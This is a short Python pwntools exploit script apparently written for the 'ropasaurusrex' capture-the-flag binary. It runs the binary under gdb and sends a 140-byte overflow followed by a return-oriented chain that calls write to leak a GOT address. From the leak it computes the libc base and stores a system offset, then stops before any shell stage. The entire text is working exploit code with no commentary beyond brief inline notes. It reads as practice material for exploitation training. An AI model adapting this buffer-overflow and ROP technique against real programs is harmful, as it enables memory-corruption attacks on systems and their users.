from pwn import *
import time


context.terminal = ['tmux', 'splitw', '-h']

r = process("./ropasaurusrex", env={"LD_PRELOAD":"./libc-2.27.so"})

gdb.attach(r, """b *0x08048442
""")

write_address = p32(0x0804830c) 
gadget_address = p32(0x080484b6)

param1 = 1 #fd --> write into the standard output
param2 = 0x08049614 #*buf --> write from
param3 = 4 #length --> i need 4 bytes because i want to print the address (4 bytes / 32 bit addr.)

r.send(b"A" * 140 + write_address + gadget_address + p32(param1) + p32(param2) + p32(param3))
time.sleep(0.2)

write_got = u32(r.recv(4))
print("0x%x" % write_got)
libc_base = write_got - 0xd8ca0
print("0x%x" % libc_base)
libc_sytem_offset = 0x45830
r.interactive()
